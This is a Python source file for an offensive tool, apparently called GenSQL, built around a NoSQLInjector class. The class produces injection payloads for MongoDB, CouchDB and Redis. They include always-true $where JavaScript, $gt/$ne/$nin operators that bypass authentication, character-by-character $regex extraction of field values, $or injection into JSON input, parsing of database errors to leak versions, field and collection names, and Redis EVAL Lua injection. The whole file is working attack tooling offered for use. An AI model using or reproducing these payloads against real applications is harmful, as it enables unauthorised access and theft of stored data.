#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
GenSQL NoSQL Injector - MongoDB, CouchDB, Redis injection
Author: Jeevraj
Supports: $where, $regex, $gt, $ne, $nin operators
"""

import json
import re

class NoSQLInjector(object):
    """NoSQL injection for MongoDB, CouchDB, Redis."""

    def __init__(self, db_type="mongodb", verbose=False):
        self.db_type = db_type
        self.verbose = verbose
        self.operators = self._get_operators()

    def _get_operators(self):
        """Get database-specific operators."""
        operators = {
            'mongodb': {
                'where': '$where',
                'regex': '$regex',
                'gt': '$gt',
                'gte': '$gte',
                'lt': '$lt',
                'lte': '$lte',
                'ne': '$ne',
                'nin': '$nin',
                'in': '$in',
                'exists': '$exists',
                'type': '$type',
            },
            'couchdb': {
                'selector': '_id',
                'index': '_design',
            },
            'redis': {
                'command': 'EVAL',
            }
        }
        return operators.get(self.db_type, {})

    def generate_where_injection(self, field, value):
        """
        Generate $where operator injection for MongoDB.
        
        Args:
            field: Database field name
            value: Injection value
        
        Returns:
            MongoDB query with $where injection
        """
        payloads = [
            {field: {"$where": f"this.{field} == '{value}' || '1'=='1'"}},
            {field: {"$where": f"function() {{ return true; }}"}},
            {field: {"$where": f"function() {{ return this.{field}.match(/.*/) }}"}},
        ]
        return payloads

    def generate_regex_injection(self, field, regex_pattern):
        """
        Generate $regex operator injection.
        
        Args:
            field: Database field
            regex_pattern: Regex pattern for blind matching
        
        Returns:
            MongoDB query with $regex
        """
        return {field: {"$regex": regex_pattern, "$options": "i"}}

    def generate_comparison_injection(self, field, value=None):
        """
        Generate comparison operator injections ($gt, $ne, $exists).
        
        Args:
            field: Database field
            value: Comparison value
        
        Returns:
            List of MongoDB queries
        """
        payloads = [
            {field: {"$gt": ""}},  # Greater than empty string (true for any value)
            {field: {"$ne": None}},  # Not equal to null
            {field: {"$exists": True}},  # Field exists
            {field: {"$nin": []}},  # Not in empty array (true for all values)
            {field: {"$type": "string"}},  # Type check
        ]
        return payloads

    def generate_json_injection(self, json_input):
        """
        Inject JSON structure to bypass filters.
        
        Args:
            json_input: Original JSON input
        
        Returns:
            Injected JSON payloads
        """
        payloads = []
        
        # Attempt to break out of field context
        if isinstance(json_input, dict):
            for key in json_input.keys():
                # Inject MongoDB operators
                injected = json_input.copy()
                injected[key] = {"$gt": ""}
                payloads.append(injected)
                
                # Inject $or operator
                injected = json_input.copy()
                injected["$or"] = [{key: {"$ne": None}}]
                payloads.append(injected)
        
        return payloads

    def generate_time_based_blind(self, field, max_depth=5):
        """
        Generate time-based blind NoSQL injection.
        
        Args:
            field: Database field
            max_depth: Maximum character depth to try
        
        Returns:
            List of time-based payloads
        """
        payloads = []
        
        for i in range(max_depth):
            # Try to extract character by character using $regex
            for char_code in range(32, 127):  # Printable ASCII
                char = chr(char_code)
                query = {
                    field: {
                        "$regex": f"^.{{{i}}}{re.escape(char)}"
                    }
                }
                payloads.append(query)
        
        return payloads

    def generate_array_injection(self, field):
        """
        Exploit array field handling.
        
        Args:
            field: Array field name
        
        Returns:
            Array injection payloads
        """
        payloads = [
            {field: []},  # Empty array
            {field: [{"$ne": None}]},  # Array with condition
            {field: {"$elemMatch": {"$gt": ""}}},  # Element match
        ]
        return payloads

    def parse_mongodb_error(self, error_text):
        """
        Parse MongoDB error for information disclosure.
        
        Args:
            error_text: Error message from MongoDB
        
        Returns:
            Dict of extracted info
        """
        info = {}
        
        # Extract version
        version_match = re.search(r'version\s+([\d.]+)', error_text, re.I)
        if version_match:
            info['version'] = version_match.group(1)
        
        # Extract field names from error
        field_match = re.findall(r"field '([^']+)'", error_text, re.I)
        if field_match:
            info['fields'] = field_match
        
        # Extract collection names
        collection_match = re.findall(r"collection '([^']+)'", error_text, re.I)
        if collection_match:
            info['collections'] = collection_match
        
        return info

    def couchdb_injection(self, selector_field, value):
        """
        Generate CouchDB selector-based injection.
        
        Args:
            selector_field: Field to inject
            value: Injection value
        
        Returns:
            CouchDB query
        """
        return {
            "selector": {
                selector_field: {"$gt": value},
                "_id": {"$regex": "^.*$"}
            }
        }

    def redis_eval_injection(self, lua_payload):
        """
        Generate Redis EVAL injection using Lua scripting.
        
        Args:
            lua_payload: Lua script payload
        
        Returns:
            Redis EVAL command
        """
        return f"EVAL \"{lua_payload}\" 0"
